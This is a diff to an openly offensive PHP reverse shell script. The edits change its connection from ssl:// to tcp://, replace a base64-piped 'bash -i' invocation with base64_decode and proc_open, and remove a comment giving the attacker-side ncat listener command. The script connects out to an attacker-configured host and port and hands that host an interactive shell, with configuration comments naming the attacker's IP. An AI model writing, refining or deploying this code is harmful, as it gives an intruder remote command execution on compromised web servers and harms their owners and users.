@@ -1,10 +1,8 @@
 <?php
 // WRITTEN AND MAINTAINED BY NZRXHX
-// ON YOUR ATTACKER MACHINE USE: ncat -lvnp 443 --ssl
-// YOU MIGHT WENT TO CONFIGURE PORT FORWARDING ON YOUR ROUTER OR VPN FOR PUBLIC IP USE
 // CONFIGURATION
-$allowed_hosts = ['192.168.1.1'];  // Your IP/domain only
-$remote_host   = '192.168.1.1';      // Attacker's IP/domain
+$allowed_hosts = ['192.168.1.1'];  // Your IP/domain only (supports a list of IPs)
+$remote_host   = '192.168.1.1';      // your Attacker's IP/domain
 $remote_port   = 443;                  // TLS Port (can be changed to a personal port e.g:7777) 
 $timeout       = 10;
 
@@ -37,7 +35,7 @@ $opts = [
     ]
 ];
 $context = stream_context_create($opts);
-$socket = stream_socket_client("ssl://$remote_host:$remote_port", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $context);
+$socket = stream_socket_client("tcp://$remote_host:$remote_port", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $context);
 
 if (!$socket) exit;
 
@@ -51,7 +49,8 @@ $descriptors = [
     2 => ["pipe", "w"]
 ];
 
-$process = proc_open("bash -c {echo,$wrapped_shell}|{base64,-d}|{bash,-i}", $descriptors, $pipes);
+$decoded = base64_decode($wrapped_shell);
+$process = proc_open($decoded, $descriptors, $pipes);
 if (!is_resource($process)) {
     fclose($socket);
     exit;
